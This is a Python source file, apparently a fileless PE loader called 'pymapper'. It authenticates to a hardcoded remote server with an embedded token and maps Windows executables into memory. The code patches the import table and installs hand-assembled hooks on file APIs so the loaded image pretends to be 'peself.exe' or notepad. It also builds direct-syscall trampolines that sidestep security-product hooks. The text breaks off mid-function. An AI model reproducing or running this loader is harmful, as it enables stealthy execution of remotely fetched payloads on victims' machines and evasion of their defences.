from __future__ import annotations

import ctypes
import hashlib
import hmac
import os
import secrets
import struct
import sys
import time
import urllib.error
import urllib.request
from ctypes import wintypes
from pathlib import Path

URL = "http://85.121.179.7:8000"
TOKEN = "e6adfdbe87e1d8ae9afc2856e6d39e5adb7fffa6fd879cff19bcb5052929a332"
HASH = "464bc0bd3e716d5276909c4b2cf0817f8579d5fd4bcc784557b74ec6f66fa403"

MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
PAGE_RW, PAGE_XR, PAGE_XRW, PAGE_RO = 0x04, 0x20, 0x40, 0x02
DLL_PROCESS_ATTACH = 1
REL_DIR64, REL_HIGHLOW = 10, 3
LOAD_ALTERED = 0x00000008
ORDINAL64 = 0x8000000000000000
CREATE_SUSPENDED = 0x4
CTX_AMD64_FULL = 0x10000B
CTX_SIZE = 1232
OFF_FLAGS, OFF_RDX, OFF_RIP = 0x30, 0x88, 0xF8


def _sign(method, path, body):
    ts = str(int(time.time()))
    nonce = secrets.token_hex(8)
    digest = hashlib.sha256(body or b"").hexdigest()
    msg = f"{ts}\n{nonce}\n{method.upper()}\n{path}\n{digest}".encode()
    return {
        "X-PyMapper-Client": "pymapper-client/0.5",
        "X-PyMapper-Ts": ts,
        "X-PyMapper-Nonce": nonce,
        "X-PyMapper-Sign": hmac.new(TOKEN.encode(), msg, hashlib.sha256).hexdigest(),
    }


def _http(method, path, body=b""):
    headers = _sign(method, path, body)
    req = urllib.request.Request(
        URL.rstrip("/") + path,
        data=body if method.upper() != "GET" else None,
        method=method,
        headers=headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")[:400]
        raise SystemExit(f"HTTP {exc.code} {path}: {detail}") from exc


def _u16(b, o):
    return struct.unpack_from("<H", b, o)[0]


def _u32(b, o):
    return struct.unpack_from("<I", b, o)[0]


def _u64(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def _rva_off(sections, rva):
    for va, vsz, raw_ptr, raw_sz in sections:
        if va <= rva < va + max(vsz, raw_sz):
            return raw_ptr + (rva - va)
    return None


def _cstring(data, off):
    end = data.find(b"\x00", off)
    if end < 0:
        end = min(off + 256, len(data))
    return data[off:end].decode("utf-8", "replace")


def _parse_pe(data):
    if data[:2] != b"MZ":
        raise ValueError("not MZ")
    e_lfanew = _u32(data, 0x3C)
    coff = e_lfanew + 4
    machine = _u16(data, coff)
    nsec = _u16(data, coff + 2)
    opt_sz = _u16(data, coff + 16)
    chars = _u16(data, coff + 18)
    opt = coff + 20
    magic = _u16(data, opt)
    if machine != 0x8664 or magic != 0x20B:
        raise ValueError("AMD64 PE32+ only")
    entry = _u32(data, opt + 16)
    image_base = _u64(data, opt + 24)
    size_image = _u32(data, opt + 56)
    size_hdr = _u32(data, opt + 60)
    num_dirs = _u32(data, opt + 108)
    dirs = [(_u32(data, opt + 112 + i * 8), _u32(data, opt + 116 + i * 8)) for i in range(min(num_dirs, 16))]
    sec_off = opt + opt_sz
    sections = []
    last_raw = 0
    for i in range(nsec):
        o = sec_off + i * 40
        vsz, va, rsz, rptr = struct.unpack_from("<IIII", data, o + 8)
        schars = _u32(data, o + 36)
        sections.append((va, vsz, rptr, rsz, schars))
        last_raw = max(last_raw, rptr + rsz)
    overlay = data[last_raw:] if last_raw < len(data) else b""
    return {
        "entry": entry,
        "image_base": image_base,
        "size_image": size_image,
        "size_hdr": size_hdr,
        "dirs": dirs,
        "sections": sections,
        "dll": bool(chars & 0x2000),
        "data": data,
        "overlay": overlay,
    }


def _dir(pe, idx):
    dirs = pe["dirs"]
    return dirs[idx] if idx < len(dirs) else (0, 0)


def _fallback(dll):
    n = dll.lower()
    if n.startswith("api-ms-win-crt-") or n.startswith("api-ms-win-core-crt-"):
        return ["ucrtbase.dll", "msvcrt.dll"]
    if n.startswith("api-ms-win-core-") or n.startswith("ext-ms-win-"):
        return ["kernel32.dll", "kernelbase.dll", "ntdll.dll"]
    if n.startswith("vcruntime"):
        return ["vcruntime140.dll", "vcruntime140_1.dll", "msvcrt.dll"]
    if n == "ucrtbase.dll":
        return ["ucrtbase.dll", "msvcrt.dll"]
    return [dll]


def _search_dirs():
    windir = Path(os.environ.get("WINDIR", r"C:\Windows"))
    out = []
    for d in (
        Path(sys.executable).resolve().parent,
        Path(getattr(sys, "base_prefix", sys.prefix)),
        Path(sys.prefix),
        Path(sys.prefix) / "DLLs",
        windir / "System32",
    ):
        if d.is_dir() and d not in out:
            out.append(d)
    return out


def _k32():
    return ctypes.WinDLL("kernel32", use_last_error=True)


def _load_mod(k32, name):
    LoadLibraryW = k32.LoadLibraryW
    LoadLibraryW.restype = wintypes.HMODULE
    LoadLibraryW.argtypes = [wintypes.LPCWSTR]
    LoadLibraryExW = k32.LoadLibraryExW
    LoadLibraryExW.restype = wintypes.HMODULE
    LoadLibraryExW.argtypes = [wintypes.LPCWSTR, wintypes.HANDLE, wintypes.DWORD]
    names = []
    for n in [name, *_fallback(name)]:
        if n not in names:
            names.append(n)
    for n in names:
        h = LoadLibraryW(n)
        if h:
            return int(h)
        stem = Path(n).name
        for folder in _search_dirs():
            full = folder / stem
            if full.is_file():
                h = LoadLibraryExW(str(full), None, LOAD_ALTERED)
                if h:
                    return int(h)
    raise OSError("LoadLibrary " + name)


def _get_proc(k32, hmod, raw_name, ordinal):
    GetProcAddress = k32.GetProcAddress
    GetProcAddress.restype = ctypes.c_void_p
    GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_void_p]
    if raw_name:
        buf = ctypes.create_string_buffer(raw_name)
        proc = GetProcAddress(hmod, ctypes.cast(buf, ctypes.c_void_p))
    elif ordinal:
        proc = GetProcAddress(hmod, ctypes.c_void_p(int(ordinal) & 0xFFFF))
    else:
        return 0
    return int(proc) if proc else 0


def _virt_alloc(k32, preferred, size):
    VirtualAlloc = k32.VirtualAlloc
    VirtualAlloc.restype = ctypes.c_void_p
    VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    base = VirtualAlloc(ctypes.c_void_p(preferred), size, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    if base:
        return int(base)
    base = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    if not base:
        raise ctypes.WinError(ctypes.get_last_error())
    return int(base)


def _map_image(pe, base):
    data = pe["data"]
    hdr = min(pe["size_hdr"], len(data))
    ctypes.memmove(ctypes.c_void_p(base), data[:hdr], hdr)
    for va, vsz, rptr, rsz, _c in pe["sections"]:
        raw = data[rptr : rptr + rsz]
        if raw:
            ctypes.memmove(ctypes.c_void_p(base + va), raw, len(raw))


def _relocs(pe, base, delta):
    rva, size = _dir(pe, 5)
    if not rva or not size or not delta:
        return
    data = pe["data"]
    secs = [(va, vsz, rp, rs) for va, vsz, rp, rs, _ in pe["sections"]]
    off = _rva_off(secs, rva)
    if off is None:
        return
    end = off + size
    while off + 8 <= end:
        page, block = _u32(data, off), _u32(data, off + 4)
        if block < 8:
            break
        count = (block - 8) // 2
        for i in range(count):
            ent = _u16(data, off + 8 + i * 2)
            typ, rel = ent >> 12, ent & 0xFFF
            addr = base + page + rel
            if typ == REL_DIR64:
                ctypes.c_ulonglong.from_address(addr).value = (
                    ctypes.c_ulonglong.from_address(addr).value + delta
                ) & ((1 << 64) - 1)
            elif typ == REL_HIGHLOW:
                ctypes.c_uint.from_address(addr).value = (
                    ctypes.c_uint.from_address(addr).value + delta
                ) & 0xFFFFFFFF
        off += block


def _walk_imports(pe, desc_rva, base, preferred, k32):
    data = pe["data"]
    secs = [(va, vsz, rp, rs) for va, vsz, rp, rs, _ in pe["sections"]]
    n = 0
    idx = 0
    cache = {}
    while True:
        doff = _rva_off(secs, desc_rva + idx * 20)
        if doff is None:
            break
        oft, _ts, _fc, name_rva, ft = struct.unpack_from("<IIIII", data, doff)
        if oft == 0 and name_rva == 0 and ft == 0:
            break
        noff = _rva_off(secs, name_rva)
        dll = _cstring(data, noff) if noff is not None else ""
        key = dll.lower()
        if key not in cache:
            cache[key] = _load_mod(k32, dll)
        hmod = cache[key]
        thunk_rva = oft or ft
        i = 0
        while True:
            toff = _rva_off(secs, thunk_rva + i * 8)
            if toff is None:
                break
            thunk = _u64(data, toff)
            if thunk == 0:
                break
            raw_name, ordinal = None, None
            if thunk & ORDINAL64:
                ordinal = thunk & 0xFFFF
            else:
                nroff = _rva_off(secs, thunk & 0x7FFFFFFF)
                if nroff is not None:
                    raw_name = data[nroff + 2 :].split(b"\x00", 1)[0]
            proc = _get_proc(k32, hmod, raw_name, ordinal)
            if not proc:
                for alt in _fallback(dll):
                    if alt.lower() == key:
                        continue
                    try:
                        h2 = cache.get(alt.lower()) or _load_mod(k32, alt)
                        cache[alt.lower()] = h2
                        proc = _get_proc(k32, h2, raw_name, ordinal)
                    except OSError:
                        continue
                    if proc:
                        break
            if not proc:
                raise OSError("GetProcAddress %s %s" % (dll, raw_name or ordinal))
            ctypes.c_ulonglong.from_address(base + ft + i * 8).value = proc & ((1 << 64) - 1)
            n += 1
            i += 1
        idx += 1
    return n


def _protect(k32, pe, base):
    old = wintypes.DWORD()
    VirtualProtect = k32.VirtualProtect
    VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    VirtualProtect.restype = wintypes.BOOL
    for va, vsz, _rp, rsz, ch in pe["sections"]:
        if ch & 0x20000000 and ch & 0x80000000:
            prot = PAGE_XRW
        elif ch & 0x20000000:
            prot = PAGE_XR
        elif ch & 0x80000000:
            prot = PAGE_RW
        else:
            prot = PAGE_RO
        VirtualProtect(ctypes.c_void_p(base + va), max(vsz, rsz, 1), prot, ctypes.byref(old))


class _Asm:
    def __init__(self):
        self.buf = bytearray()
        self.lab = {}
        self.fix = []
        self.fix32 = []

    def e(self, b):
        self.buf.extend(b)

    def L(self, n):
        self.lab[n] = len(self.buf)

    def j8(self, op, n):
        self.e(bytes([op, 0]))
        self.fix.append((len(self.buf) - 1, n))

    def je32(self, n):
        self.e(b"\x0F\x84\x00\x00\x00\x00")
        self.fix32.append((len(self.buf) - 4, n))

    def jne32(self, n):
        self.e(b"\x0F\x85\x00\x00\x00\x00")
        self.fix32.append((len(self.buf) - 4, n))

    def jmp32(self, n):
        self.e(b"\xE9\x00\x00\x00\x00")
        self.fix32.append((len(self.buf) - 4, n))

    def done(self):
        for off, n in self.fix:
            rel = self.lab[n] - (off + 1)
            self.buf[off] = rel & 0xFF
        for off, n in self.fix32:
            rel = self.lab[n] - (off + 4)
            struct.pack_into("<i", self.buf, off, rel)
        return bytes(self.buf)


def _imm64(op, addr):
    return op + struct.pack("<Q", addr)


def _hook_exit(pe, base, k32):
    exit_proc = ctypes.cast(k32.ExitProcess, ctypes.c_void_p).value
    iat_rva, iat_sz = _dir(pe, 12)
    if not iat_rva or not iat_sz:
        return
    old = wintypes.DWORD()
    k32.VirtualProtect(ctypes.c_void_p(base + iat_rva), iat_sz, PAGE_RW, ctypes.byref(old))
    for off in range(0, iat_sz, 8):
        slot = base + iat_rva + off
        if ctypes.c_ulonglong.from_address(slot).value == exit_proc:
            ctypes.c_ulonglong.from_address(slot).value = ctypes.cast(k32.ExitThread, ctypes.c_void_p).value
    k32.VirtualProtect(ctypes.c_void_p(base + iat_rva), iat_sz, old.value, ctypes.byref(old))


def _patch_iat(pe, base, k32, old_fn, new_fn):
    iat_rva, iat_sz = _dir(pe, 12)
    if not iat_rva or not iat_sz:
        return 0
    n = 0
    old = wintypes.DWORD()
    k32.VirtualProtect(ctypes.c_void_p(base + iat_rva), iat_sz, PAGE_RW, ctypes.byref(old))
    for off in range(0, iat_sz, 8):
        slot = base + iat_rva + off
        if ctypes.c_ulonglong.from_address(slot).value == old_fn:
            ctypes.c_ulonglong.from_address(slot).value = new_fn
            n += 1
    k32.VirtualProtect(ctypes.c_void_p(base + iat_rva), iat_sz, old.value, ctypes.byref(old))
    return n


def _sys_tramp(fn):
    p = ctypes.cast(fn, ctypes.c_void_p).value
    b = ctypes.string_at(p, 16)
    if b[0:3] == b"\x4C\x8B\xD1" and b[3] == 0xB8:
        ssn = struct.unpack_from("<I", b, 4)[0]
        return b"\x4C\x8B\xD1\xB8" + struct.pack("<I", ssn) + b"\x0F\x05\xC3"
    return b"\x4C\x8B\xD1" + b[3:8] + b"\x0F\x05\xC3"


def _fwd(fn):
    p = ctypes.cast(fn, ctypes.c_void_p).value
    b = ctypes.string_at(p, 16)
    if b[0] == 0xFF and b[1] == 0x25:
        disp = struct.unpack_from("<i", b, 2)[0]
        return ctypes.c_uint64.from_address(p + 6 + disp).value
    if b[0] == 0x48 and b[1] == 0xFF and b[2] == 0x25:
        disp = struct.unpack_from("<i", b, 3)[0]
        return ctypes.c_uint64.from_address(p + 7 + disp).value
    return p


def _install_io_hooks(pe, base, k32, hook_base, blob_ptr, blob_size):
    kn = ctypes.WinDLL("kernel32")
    gpa = ctypes.cast(kn.GetProcAddress, ctypes.c_void_p).value
    fake = 0x1EE7F11E
    self_path = os.path.join(os.environ.get("TEMP") or os.environ.get("TMP") or r"C:\Windows\Temp", "peself.exe")
    path_w = (self_path + "\x00").encode("utf-16le")
    path_a = (self_path + "\x00").encode("mbcs", "replace")
    names = [
        b"CreateFileW\x00", b"CreateFileA\x00", b"ReadFile\x00",
        b"GetFileSize\x00", b"SetFilePointer\x00", b"GetModuleFileNameW\x00",
        b"GetModuleFileNameA\x00", b"CloseHandle\x00", b"GetFileSizeEx\x00",
        b"SetFilePointerEx\x00",
    ]
    cur = hook_base

    def store(b):
        nonlocal cur
        addr = cur
        ctypes.memmove(cur, b, len(b))
        cur += (len(b) + 15) & ~15
        return addr

    path_w_addr = store(path_w)
    path_a_addr = store(path_a)
    name_addrs = [store(nm) for nm in names]
    data = cur
    ctypes.memset(ctypes.c_void_p(data), 0, 0x100)
    ctypes.c_ulonglong.from_address(data + 0).value = gpa
    ctypes.c_ulonglong.from_address(data + 8).value = blob_ptr
    ctypes.c_ulonglong.from_address(data + 16).value = blob_size
    ctypes.c_ulonglong.from_address(data + 24).value = 0
    ctypes.c_ulonglong.from_address(data + 32).value = fake
    cur = data + 0x100

    def put(blob):
        nonlocal cur
        cur = (cur + 15) & ~15
        addr = cur
        ctypes.memmove(cur, blob, len(blob))
        cur += len(blob)
        return addr

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\xFF\x40\x50")
    a.e(b"\x48\x85\xC9")
    a.j8(0x74, "hit")
    a.e(_imm64(b"\x48\xB8", base))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.L("hit")
    a.e(_imm64(b"\x48\xB8", path_w_addr))
    a.e(b"\x4D\x33\xC9")
    a.L("cp")
    a.e(b"\x66\x46\x8B\x14\x48")
    a.e(b"\x66\x46\x89\x14\x4A")
    a.e(b"\x66\x45\x85\xD2")
    a.j8(0x74, "wdone")
    a.e(b"\x49\xFF\xC1")
    a.j8(0xEB, "cp")
    a.L("wdone")
    a.e(b"\x41\x8B\xC1\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", _fwd(kn.GetModuleFileNameW)))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_gmf_w = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(b"\x48\x85\xC9")
    a.j8(0x74, "hit")
    a.e(_imm64(b"\x48\xB8", base))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.L("hit")
    a.e(_imm64(b"\x48\xB8", path_a_addr))
    a.e(b"\x4D\x33\xC9")
    a.L("cp")
    a.e(b"\x46\x8A\x04\x08")
    a.e(b"\x46\x88\x04\x0A")
    a.e(b"\x41\x84\xC0")
    a.j8(0x74, "adone")
    a.e(b"\x49\xFF\xC1")
    a.j8(0xEB, "cp")
    a.L("adone")
    a.e(b"\x41\x8B\xC1\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", ctypes.cast(kn.GetModuleFileNameA, ctypes.c_void_p).value))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_gmf_a = put(a.done())

    def _wscan(a):
        a.e(b"\x48\x85\xC9")
        a.je32("real")
        a.e(b"\x48\x89\xCA")
        a.L("scan")
        a.e(b"\x0F\xB7\x02")
        a.e(b"\x66\x85\xC0")
        a.je32("real")
        a.e(b"\x0F\xB7\x02\x83\xC8\x20\x83\xF8\x6E")
        a.jne32("tryp")
        for i, ch in enumerate(b"otepad"):
            a.e(b"\x0F\xB7\x42" + bytes([(i + 1) * 2]))
            a.e(b"\x83\xC8\x20\x83\xF8" + bytes([ch]))
            a.jne32("tryp")
        a.jmp32("hit")
        a.L("tryp")
        a.e(b"\x0F\xB7\x02\x83\xC8\x20\x83\xF8\x70")
        a.jne32("next")
        for i, ch in enumerate(b"eself"):
            a.e(b"\x0F\xB7\x42" + bytes([(i + 1) * 2]))
            a.e(b"\x83\xC8\x20\x83\xF8" + bytes([ch]))
            a.jne32("next")
        a.jmp32("hit")
        a.L("next")
        a.e(b"\x48\x83\xC2\x02")
        a.jmp32("scan")

    a = _Asm()
    a.e(b"\x48\x83\xEC\x38")
    a.e(b"\x48\x89\x54\x24\x20")
    a.e(b"\x4C\x89\x44\x24\x28")
    a.e(b"\x4C\x89\x4C\x24\x30")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\xFF\x40\x58")
    a.e(b"\x48\x89\x48\x60")
    _wscan(a)
    a.L("hit")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\xFF\x40\x38")
    a.e(b"\x48\x83\x78\x38\x03")
    a.j8(0x77, "real")
    a.e(b"\x48\xC7\x40\x18\x00\x00\x00\x00")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x83\xC4\x38\xC3")
    a.L("real")
    a.e(b"\x48\x8B\x54\x24\x20")
    a.e(b"\x4C\x8B\x44\x24\x28")
    a.e(b"\x4C\x8B\x4C\x24\x30")
    a.e(_imm64(b"\x48\xB8", _fwd(kn.CreateFileW)))
    a.e(b"\x48\x83\xC4\x38\xFF\xE0")
    addr_cfw = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(b"\x48\x85\xC9")
    a.je32("real")
    a.e(b"\x48\x89\xCA")
    a.L("scan")
    a.e(b"\x8A\x02\x84\xC0")
    a.je32("real")
    a.e(b"\x8A\x02\x0C\x20\x3C\x6E")
    a.jne32("tryps")
    for i, ch in enumerate(b"otepad"):
        a.e(b"\x8A\x42" + bytes([i + 1]))
        a.e(b"\x0C\x20\x3C" + bytes([ch]))
        a.jne32("tryps")
    a.jmp32("hit")
    a.L("tryps")
    a.e(b"\x8A\x02\x0C\x20\x3C\x70")
    a.jne32("next")
    for i, ch in enumerate(b"eself"):
        a.e(b"\x8A\x42" + bytes([i + 1]))
        a.e(b"\x0C\x20\x3C" + bytes([ch]))
        a.jne32("next")
    a.jmp32("hit")
    a.L("next")
    a.e(b"\x48\xFF\xC2")
    a.jmp32("scan")
    a.L("hit")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", ctypes.cast(kn.CreateFileA, ctypes.c_void_p).value))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_cfa = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x49\xFF\x42\x90")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(b"\x45\x8B\xC0")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x49\x8B\x42\x08")
    a.e(b"\x49\x03\x42\x18")
    a.e(b"\x4D\x8B\x5A\x10")
    a.e(b"\x4D\x2B\x5A\x18")
    a.e(b"\x4D\x85\xDB")
    a.j8(0x79, "okneg")
    a.e(b"\x4D\x33\xDB")
    a.L("okneg")
    a.e(b"\x4D\x3B\xD8")
    a.j8(0x73, "okn")
    a.e(b"\x4D\x8B\xC3")
    a.L("okn")
    a.e(b"\x4D\x85\xC9")
    a.j8(0x74, "nout")
    a.e(b"\x44\x89\x01")
    a.L("nout")
    a.e(b"\x4D\x8B\xD8")
    a.e(b"\x4D\x85\xDB")
    a.j8(0x74, "done")
    a.L("lp")
    a.e(b"\x44\x8A\x20")
    a.e(b"\x44\x88\x22")
    a.e(b"\x48\xFF\xC0")
    a.e(b"\x48\xFF\xC2")
    a.e(b"\x49\xFF\xCB")
    a.j8(0x75, "lp")
    a.L("done")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x4D\x01\x42\x18")
    a.e(b"\xB8\x01\x00\x00\x00\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", _fwd(kn.ReadFile)))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_read = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\x8B\x40\x10")
    a.e(b"\x48\x85\xD2")
    a.j8(0x74, "nohi")
    a.e(b"\xC7\x02\x00\x00\x00\x00")
    a.L("nohi")
    a.e(b"\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", ctypes.cast(kn.GetFileSize, ctypes.c_void_p).value))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_gfs = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(b"\x48\x63\xD2")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x41\x83\xF9\x00")
    a.j8(0x75, "notbeg")
    a.e(b"\x48\x89\x50\x18")
    a.j8(0xEB, "retp")
    a.L("notbeg")
    a.e(b"\x41\x83\xF9\x01")
    a.j8(0x75, "end")
    a.e(b"\x48\x01\x50\x18")
    a.j8(0xEB, "retp")
    a.L("end")
    a.e(b"\x48\x8B\x48\x10")
    a.e(b"\x48\x01\xD1")
    a.e(b"\x48\x89\x48\x18")
    a.L("retp")
    a.e(b"\x48\x8B\x40\x18")
    a.e(b"\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", ctypes.cast(kn.SetFilePointer, ctypes.c_void_p).value))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_sfp = put(a.done())

    a = _Asm()
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(_imm64(b"\x48\xB8", data + 0xA0))
    a.e(b"\x48\xFF\x00")
    a.e(b"\x48\x8B\x04\x24")
    a.e(b"\x80\x38\x48")
    a.j8(0x75, "plain")
    a.e(b"\x81\x78\x01\x83\xC4\x20\xC3")
    a.j8(0x75, "plain")
    a.e(b"\xB8\x01\x00\x00\x00")
    a.e(b"\x48\x8B\x4C\x24\x28")
    a.e(b"\x48\x83\xC4\x30")
    a.e(b"\xFF\xE1")
    a.L("plain")
    a.e(b"\xB8\x01\x00\x00\x00\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", _fwd(kn.CloseHandle)))
    a.e(b"\xFF\xE0")
    addr_ch = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\x8B\x40\x10")
    a.e(b"\x48\x89\x02")
    a.e(b"\xB8\x01\x00\x00\x00\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", ctypes.cast(kn.GetFileSizeEx, ctypes.c_void_p).value))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_gfsx = put(a.done())

    a = _Asm()
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.j8(0x75, "real")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x41\x83\xF9\x00")
    a.j8(0x75, "nb")
    a.e(b"\x49\x89\x52\x18")
    a.j8(0xEB, "ok")
    a.L("nb")
    a.e(b"\x41\x83\xF9\x01")
    a.j8(0x75, "en")
    a.e(b"\x49\x01\x52\x18")
    a.j8(0xEB, "ok")
    a.L("en")
    a.e(b"\x49\x8B\x42\x10")
    a.e(b"\x48\x01\xD0")
    a.e(b"\x49\x89\x42\x18")
    a.L("ok")
    a.e(b"\x4D\x85\xC0")
    a.j8(0x74, "nowrite")
    a.e(b"\x49\x8B\x42\x18")
    a.e(b"\x49\x89\x00")
    a.L("nowrite")
    a.e(b"\x48\x8B\x04\x24")
    a.e(b"\x49\x89\x82\xB0\x00\x00\x00")
    a.e(b"\x48\x8B\x44\x24\x28")
    a.e(b"\x49\x89\x82\xB8\x00\x00\x00")
    a.e(_imm64(b"\x48\xB8", data + 0x98))
    a.e(b"\x48\xFF\x00")
    a.e(b"\x48\x8B\x04\x24")
    a.e(b"\x80\x38\x48")
    a.j8(0x75, "plain")
    a.e(b"\x81\x78\x01\x83\xC4\x20\xC3")
    a.j8(0x75, "plain")
    a.e(b"\xB8\x01\x00\x00\x00")
    a.e(b"\x48\x8B\x4C\x24\x28")
    a.e(b"\x48\x83\xC4\x30")
    a.e(b"\xFF\xE1")
    a.L("plain")
    a.e(b"\xB8\x01\x00\x00\x00\xC3")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", _fwd(kn.SetFilePointerEx)))
    a.e(b"\xFF\xE0")
    addr_sfpx = put(a.done())

    nt = ctypes.WinDLL("ntdll")
    tramp_c = put(_sys_tramp(nt.NtCreateFile))
    tramp_r = put(_sys_tramp(nt.NtReadFile))
    tramp_q = put(_sys_tramp(nt.NtQueryInformationFile))

    tramp_a = put(_sys_tramp(nt.NtQueryAttributesFile))
    tramp_o = put(_sys_tramp(nt.NtOpenFile))

    def _nt_create(tramp):
        a = _Asm()
        a.e(b"\x48\x83\xEC\x48")
        a.e(b"\x48\x89\x4C\x24\x20")
        a.e(b"\x48\x89\x54\x24\x28")
        a.e(b"\x4C\x89\x44\x24\x30")
        a.e(b"\x4C\x89\x4C\x24\x38")
        a.e(_imm64(b"\x48\xB8", data + 40))
        a.e(b"\x48\xFF\x00")
        a.e(b"\x4D\x85\xC0")
        a.je32("orig")
        a.e(b"\x49\x8B\x40\x10")
        a.e(b"\x48\x85\xC0")
        a.je32("orig")
        a.e(b"\x48\x8B\x40\x08")
        a.e(b"\x48\x85\xC0")
        a.je32("orig")
        a.e(b"\x48\x89\xC1")
        a.e(_imm64(b"\x48\xB8", data + 0x80))
        a.e(b"\x48\x89\x08")
        _wscan(a)
        a.L("hit")
        a.e(_imm64(b"\x48\xB8", data + 0x80))
        a.e(b"\x48\x8B\x00")
        a.e(b"\x48\x8B\x00")
        a.e(_imm64(b"\x48\xB9", data + 0xA8))
        a.e(b"\x48\x89\x01")
        a.e(_imm64(b"\x48\xB8", data + 0x88))
        a.e(b"\x48\xFF\x00")
        a.e(b"\x48\x8B\x4C\x24\x20")
        a.e(_imm64(b"\x48\xB8", fake))
        a.e(b"\x48\x89\x01")
        a.e(b"\x4C\x8B\x4C\x24\x38")
        a.e(b"\x4D\x85\xC9")
        a.je32("oknt")
        a.e(b"\x49\xC7\x01\x00\x00\x00\x00")
        a.e(b"\x49\xC7\x41\x08\x00\x00\x00\x00")
        a.L("oknt")
        a.e(b"\x33\xC0\x48\x83\xC4\x48\xC3")
        a.L("real")
        a.L("orig")
        a.e(b"\x48\x8B\x4C\x24\x20")
        a.e(b"\x48\x8B\x54\x24\x28")
        a.e(b"\x4C\x8B\x44\x24\x30")
        a.e(b"\x4C\x8B\x4C\x24\x38")
        a.e(_imm64(b"\x48\xB8", tramp))
        a.e(b"\x48\x83\xC4\x48\xFF\xE0")
        return put(a.done())

    addr_ntc = _nt_create(tramp_c)
    addr_nto = _nt_create(tramp_o)

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(b"\x48\x89\x4C\x24\x20")
    a.e(b"\x48\x89\x54\x24\x18")
    a.e(_imm64(b"\x48\xB8", data + 0x78))
    a.e(b"\x48\xFF\x00")
    a.e(b"\x48\x85\xC9")
    a.je32("orig")
    a.e(b"\x48\x8B\x41\x10")
    a.e(b"\x48\x85\xC0")
    a.je32("orig")
    a.e(b"\x48\x8B\x40\x08")
    a.e(b"\x48\x85\xC0")
    a.je32("orig")
    a.e(b"\x48\x89\xC1")
    a.e(b"\x48\x8B\x01")
    a.e(_imm64(b"\x49\xB8", data + 0x68))
    a.e(b"\x49\x89\x00")
    _wscan(a)
    a.L("hit")
    a.e(_imm64(b"\x48\xB8", data + 0x70))
    a.e(b"\x48\xFF\x00")
    a.e(b"\x48\x8B\x54\x24\x18")
    a.e(b"\x48\x85\xD2")
    a.je32("okattr")
    a.e(b"\x48\x31\xC0")
    a.e(b"\x48\x89\x02")
    a.e(b"\x48\x89\x42\x08")
    a.e(b"\x48\x89\x42\x10")
    a.e(b"\x48\x89\x42\x18")
    a.e(b"\xC7\x42\x20\x80\x00\x00\x00")
    a.L("okattr")
    a.e(b"\x33\xC0\x48\x83\xC4\x28\xC3")
    a.L("real")
    a.L("orig")
